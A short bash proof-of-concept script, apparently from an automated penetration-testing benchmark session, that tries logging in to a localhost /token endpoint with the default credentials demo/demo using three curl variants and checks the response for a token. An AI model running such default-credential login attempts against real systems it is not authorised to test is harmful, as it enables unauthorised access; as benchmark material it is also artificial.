#!/bin/bash
# POC: Direct verification of whether demo/demo credentials are actually accepted
# Target: ./repo
# Created: 2025-11-04T19:39:15.195Z
# Session: benchmark-XBEN-021-24-mhkyt5to

# Verification POC: Check actual authentication state of demo/demo

TARGET_URL="http://localhost:8080/token"

echo "[*] Direct verification of demo/demo credentials"
echo "[*] Testing with explicit curl output"
echo ""

# Test with very explicit output
echo "[*] Attempt 1: Using application/x-www-form-urlencoded"
curl -i -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo" 2>&1 | head -30

echo ""
echo "[*] Attempt 2: Checking response headers and redirects"
curl -I -X POST "$TARGET_URL" \
  -d "username=demo&password=demo" 2>&1

echo ""
echo "[*] Attempt 3: Follow redirects and capture response"
curl -L -X POST "$TARGET_URL" \
  -d "username=demo&password=demo" 2>&1 | grep -E "(location|user_token|company|Incorrect)" || echo "No redirect or token found"

echo ""
echo "[*] Test complete"